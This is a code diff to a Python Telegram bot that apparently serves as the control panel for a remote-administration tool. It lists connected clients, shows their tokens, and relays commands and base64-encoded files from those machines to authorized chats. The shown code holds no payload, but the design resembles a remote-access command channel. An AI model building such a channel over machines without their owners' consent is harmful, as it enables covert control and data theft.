@@ -2,13 +2,13 @@
 Telegram interface
 """
 import io
-
 from methods import add_command
 from models import *
 from manage import app
 import telebot
 import os
 import base64
+import time
 
 LOG = True
 
@@ -54,12 +54,47 @@ def client(func):
                 db.session.add(tg_user)
                 db.session.commit()
             if not cid.isnumeric() or not Client.query.filter_by(id=int(cid)).first():
-                bot.send_message(msg.chat.id, "Invalid client ID")
-                return
+                cln = Client.query.filter_by(name=cid).first()
+                if cln:
+                    cid = cln.id
+                else:
+                    bot.send_message(msg.chat.id, "Invalid client ID")
+                    return
             func(msg, cid)
 
     wrapper.__name__ = func.__name__
     return wrapper
+
+
+@bot.message_handler(commands=["clients"])
+def clients(msg):
+    if not check_mention(msg):
+        return
+    if msg.chat.id not in authorized:
+        bot.send_message(msg.chat.id, "Not authorized")
+        return
+    ans = "Clients:\n"
+    with app.app_context():
+        for cln in Client.query.all():
+            if time.time() - cln.last_check <= 2:
+                ans += f"<{cln.id}> ({cln.name}) Online\n"
+            elif time.time() - cln.last_check <= 60:
+                ans += f"<{cln.id}> ({cln.name}) Last online: {int(time.time() - cln.last_check)} seconds ago\n"
+            elif time.time() - cln.last_check <= 3600:
+                ans += f"<{cln.id}> ({cln.name}) Last online: {int((time.time() - cln.last_check) / 60)} minutes ago\n"
+            elif time.time() - cln.last_check <= 3600 * 24:
+                ans += f"<{cln.id}> ({cln.name}) Last online: {int((time.time() - cln.last_check) / 3600)} hours ago\n"
+            else:
+                ans += f"<{cln.id}> ({cln.name}) Last online: {time.ctime(cln.last_check)}\n"
+    bot.send_message(msg.chat.id, ans)
+
+
+@bot.message_handler(commands=["token"])
+@client
+def token(msg, cid):
+    cln = Client.query.filter_by(id=cid).first()
+    escaped_token = telebot.formatting.escape_markdown(cln.token)
+    bot.send_message(msg.chat.id, rf"<{cid}\> \({cln.name}\) Token: ||{escaped_token}||", parse_mode="MarkdownV2")
 
 
 @bot.message_handler(commands=["lock"])
@@ -406,19 +441,9 @@ def start(msg, cid):
     add_command(cid, msg.chat.id, "start", (), True)
 
 
-@bot.message_handler(commands=["monitorstart"])
+@bot.message_handler(commands=["stop"])
 @client
-def monitorstart(msg, cid):
-    if not TgMonitor.query.filter_by(tg_user_id=msg.chat.id, client_id=cid).first():
-        monitor = TgMonitor(tg_user_id=msg.chat.id, client_id=cid)
-        db.session.add(monitor)
-        db.session.commit()
-    bot.send_message(msg.chat.id, "Started monitoring")
-
-
-@bot.message_handler(commands=["monitorstop"])
-@client
-def monitorstop(msg, cid):
+def stop(msg, cid):
     monitor = TgMonitor.query.filter_by(tg_user_id=msg.chat.id, client_id=cid).first()
     if monitor:
         db.session.delete(monitor)
@@ -426,9 +451,9 @@ def monitorstop(msg, cid):
     bot.send_message(msg.chat.id, "Stopped monitoring")
 
 
-@bot.message_handler(commands=["stop"])
+@bot.message_handler(commands=["stopall"])
 @client
-def stop(msg, cid):
+def stop_all(msg, cid):
     monitor = TgMonitor.query.filter_by(tg_user_id=msg.chat.id, client_id=cid).first()
     if monitor:
         db.session.delete(monitor)
@@ -468,11 +493,14 @@ def command(cid, uid, cmd, args):
         file.write(base64.b64decode(args[1]))
         file.seek(0)
         bot.send_document(uid, telebot.types.InputFile(file, file_name=args[0][1:-1]),
-                          caption=f"<{cid}> {cmd} {args[0]}", parse_mode="Markdown")
+                          caption=f"<{cid}> ({Client.query.filter_by(id=cid).first().name}) {cmd} {args[0]}",
+                          parse_mode="Markdown")
     elif uid:
-        bot.send_message(uid, f"<{cid}> {cmd} {' '.join(args)}", parse_mode="Markdown")
+        bot.send_message(uid, f"<{cid}> ({Client.query.filter_by(id=cid).first().name}) {cmd} {' '.join(args)}",
+                         parse_mode="Markdown")
     else:
-        send_all(cid, f"<{cid}> {cmd} {' '.join(args)}", parse_mode="Markdown")
+        send_all(cid, f"<{cid}> ({Client.query.filter_by(id=cid).first().name}) {cmd} {' '.join(args)}",
+                 parse_mode="Markdown")
 
 
 def start_polling():
